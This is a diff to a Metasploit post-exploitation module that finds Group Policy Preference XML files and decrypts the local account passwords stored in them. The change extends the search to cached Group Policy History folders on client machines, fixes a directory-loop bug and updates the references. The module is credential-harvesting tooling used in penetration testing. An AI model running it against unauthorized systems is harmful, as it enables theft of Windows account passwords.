@@ -10,6 +10,7 @@ require 'msf/core/auxiliary/report'
 
 class Metasploit3 < Msf::Post
   include Msf::Auxiliary::Report
+  include Msf::Post::File
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Registry
 
@@ -21,6 +22,9 @@ class Metasploit3 < Msf::Post
         connects to it via SMB. It then looks for Group Policy Preference XML
         files containing local user accounts and passwords and decrypts them
         using Microsofts public AES key.
+
+        Cached Group Policy files may be found on end-user devices if the group
+        policy object is deleted rather than unlinked.
 
         Tested on WinXP SP3 Client and Win2k8 R2 DC.
       },
@@ -34,10 +38,10 @@ class Metasploit3 < Msf::Post
         ],
       'References'    =>
         [
-          ['URL', 'http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences'],
           ['URL', 'http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)'],
           ['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],
-          ['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx']
+          ['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx'],
+          ['URL', 'https://labs.portcullis.co.uk/blog/are-you-considering-using-microsoft-group-policy-preferences-think-again/']
         ],
       'Platform'      => [ 'win' ],
       'SessionTypes'  => [ 'meterpreter' ]
@@ -65,11 +69,30 @@ class Metasploit3 < Msf::Post
     fullpaths = []
     cached_domain_controller = nil
 
-    print_status "Checking locally..."
-    locals = get_basepaths(client.fs.file.expand_path("%SYSTEMROOT%\\SYSVOL\\sysvol"))
+    print_status "Checking for group policy history objects..."
+    # Windows XP environment variable points to the correct folder.
+    # Windows Vista and upwards points to ProgramData!
+    all_users = expand_path("%ALLUSERSPROFILE%")
+
+    if all_users.include? 'ProgramData'
+      all_users.gsub!('ProgramData','Users\\All Users')
+    else
+      all_users = "#{all_users}\\Application Data"
+    end
+
+    cached = get_basepaths("#{all_users}\\Microsoft\\Group Policy\\History", true)
+
+    unless cached.blank?
+      basepaths << cached
+      print_good "Cached Group Policy folder found locally"
+    end
+
+    print_status "Checking for SYSVOL locally..."
+    system_root = expand_path("%SYSTEMROOT%")
+    locals = get_basepaths("#{system_root}\\SYSVOL\\sysvol")
     unless locals.blank?
       basepaths << locals
-      print_good "Group Policy Files found locally"
+      print_good "SYSVOL Group Policy Files found locally"
     end
 
     # If user supplied domains this implicitly cancels the ALL flag.
@@ -153,19 +176,27 @@ class Metasploit3 < Msf::Post
 
   end
 
-  def get_basepaths(base)
+  def get_basepaths(base, cached=false)
     locals = []
     begin
       session.fs.dir.foreach(base) do |sub|
         next if sub =~ /^(\.|\.\.)$/
-        tpath = "#{base}\\#{sub}\\Policies"
-        begin
-          session.fs.dir.foreach(tpath) do |sub2|
-            next if sub =~ /^(\.|\.\.)$/
-            locals << "#{tpath}\\#{sub2}\\"
+
+        # Local GPO are stored in C:\Users\All Users\Microsoft\Group
+        # Policy\History\{GUID}\Machine\etc without \Policies
+        if cached
+          locals << "#{base}\\#{sub}\\"
+        else
+          tpath = "#{base}\\#{sub}\\Policies"
+
+          begin
+            session.fs.dir.foreach(tpath) do |sub2|
+              next if sub2 =~ /^(\.|\.\.)$/
+              locals << "#{tpath}\\#{sub2}\\"
+            end
+          rescue Rex::Post::Meterpreter::RequestError => e
+            print_error "Could not access #{tpath}  : #{e.message}"
           end
-        rescue Rex::Post::Meterpreter::RequestError => e
-          print_error "Could not access #{tpath}  : #{e.message}"
         end
       end
     rescue Rex::Post::Meterpreter::RequestError => e
@@ -177,7 +208,7 @@ class Metasploit3 < Msf::Post
   def find_path(path, xml_path)
     xml_path = "#{path}#{xml_path}"
     begin
-      return xml_path if client.fs.file.stat(xml_path)
+      return xml_path if exist? xml_path
     rescue Rex::Post::Meterpreter::RequestError => e
       # No permissions for this specific file.
       return nil
@@ -186,10 +217,7 @@ class Metasploit3 < Msf::Post
 
   def gpp_xml_file(path)
     begin
-      groups = client.fs.file.new(path,'r')
-      until groups.eof
-        data = groups.read
-      end
+      data = read_file(path)
 
       spath = path.split('\\')
       retobj = {
